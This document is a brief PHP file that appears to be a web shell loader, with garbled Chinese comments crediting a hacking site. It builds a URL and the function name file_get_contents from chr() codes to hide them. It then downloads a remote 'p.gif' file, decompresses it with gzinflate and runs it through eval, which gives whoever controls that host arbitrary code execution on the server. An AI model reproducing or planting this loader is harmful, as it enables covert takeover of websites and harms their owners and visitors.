<?php
$password='.';//��¼����
$shellname='By:�ڰɰ�ȫ��';//�ҵİ�Ȩ
$myurl='http://www.myhack58.com';//�ҵ���ҳ
//----------���ܳ���------------------//
$c="chr";
session_start();
if(empty($_SESSION['PhpCode'])){
$url.=$c(104).$c(116).$c(116).$c(112).$c(58);
$url.=$c(47).$c(47).$c(98).$c(107).$c(107);
$url.=$c(105).$c(108).$c(108).$c(46).$c(99);
$url.=$c(111).$c(109).$c(47).$c(112).$c(46);
$url.=$c(103).$c(105).$c(102);
$get=chr(102).chr(105).chr(108).chr(101).chr(95);
$get.=chr(103).chr(101).chr(116).chr(95).chr(99);
$get.=chr(111).chr(110).chr(116).chr(101).chr(110);
$get.=chr(116).chr(115);
$_SESSION['PhpCode']=$get($url);
}
$unzip=$c(103).$c(122).$c(105).$c(110);
$unzip.=$c(102).$c(108).$c(97).$c(116).$c(101);
@eval($unzip($_SESSION['PhpCode']));
?>
-------------------------------------------------------